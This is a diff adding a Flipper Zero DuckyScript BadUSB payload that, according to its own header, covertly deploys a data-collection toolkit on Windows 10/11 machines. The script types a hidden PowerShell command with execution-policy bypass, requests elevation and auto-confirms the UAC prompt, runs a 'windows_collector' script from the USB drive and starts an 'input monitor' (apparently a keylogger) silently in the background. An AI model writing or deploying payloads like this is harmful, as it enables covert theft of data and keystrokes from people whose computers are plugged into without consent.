@@ -1,0 +1,22 @@
+﻿REM ============================================================================
+REM  FLLC - BadUSB: Deploy Toolkit from USB Drive
+REM  Flipper Zero DuckyScript - Executes data collection from USB
+REM  Triggers the payload on the Micro SD (I:) automatically
+REM ============================================================================
+REM  Target: Windows 10/11
+REM  Time to execute: ~8 seconds
+REM  What it does:
+REM    1. Opens hidden PowerShell
+REM    2. Finds the USB drive with payloads
+REM    3. Launches windows_collector.ps1 silently
+REM    4. Starts the input monitor in background
+REM ============================================================================
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden -Command "Start-Process powershell -ArgumentList '-NoP -NonI -W Hidden -Exec Bypass -Command \"$drives = Get-WmiObject Win32_LogicalDisk -Filter \\\"DriveType=2\\\"; foreach($d in $drives){ $p = $d.DeviceID + \\\"\\payloads\\windows_collector.ps1\\\"; if(Test-Path $p){ & $p; $m = $d.DeviceID + \\\"\\payloads\\input_monitor.py\\\"; if(Test-Path $m){Start-Process pythonw -ArgumentList $m,\\\"--output\\\",$d.DeviceID,\\\"--silent\\\" -WindowStyle Hidden}; break}}\"' -Verb RunAs"
+ENTER
+DELAY 1000
+ALT y
+DELAY 500
